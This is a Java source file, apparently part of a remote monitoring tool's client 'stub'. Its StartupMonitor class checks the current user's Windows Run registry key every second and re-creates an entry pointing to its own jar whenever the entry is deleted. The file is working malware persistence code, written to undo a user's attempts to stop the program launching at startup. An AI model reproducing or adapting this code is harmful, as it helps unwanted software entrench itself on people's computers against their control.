package me.jershdervis.monitorj.stub.secure;

import me.jershdervis.monitorj.stub.util.ClientSystemUtil;
import me.jershdervis.monitorj.stub.util.WinRegistry;

import java.lang.reflect.InvocationTargetException;
import java.net.URISyntaxException;

/**
 * Created by Josh on 18/06/2015.
 * This class is designed to monitor Startup keys and use persistence to keep the program in startup.
 */
public class StartupMonitor extends ClientSystemUtil implements Runnable {

    private final String keyName;

    public StartupMonitor(String keyName) {
        this.keyName = keyName;
    }

    @Override
    public void run() {
        while (true) {
            if(!this.startupKeyExists(keyName)) {
                this.createStartupKey(keyName);
            }
            try {
                Thread.sleep(1000L);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    private boolean startupKeyExists(String name) {
        try {
            String userKey = WinRegistry.readString(WinRegistry.HKEY_CURRENT_USER,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    name,
                    WinRegistry.KEY_WOW64_32KEY);
            return userKey != null;
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        }
        return false;
    }

    private void createStartupKey(String name) {
        try {
            WinRegistry.writeStringValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    name,
                    "\"" + ClientSystemUtil.jarLocationOnDisc() + "\"",
                    WinRegistry.KEY_WOW64_32KEY);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
    }
}
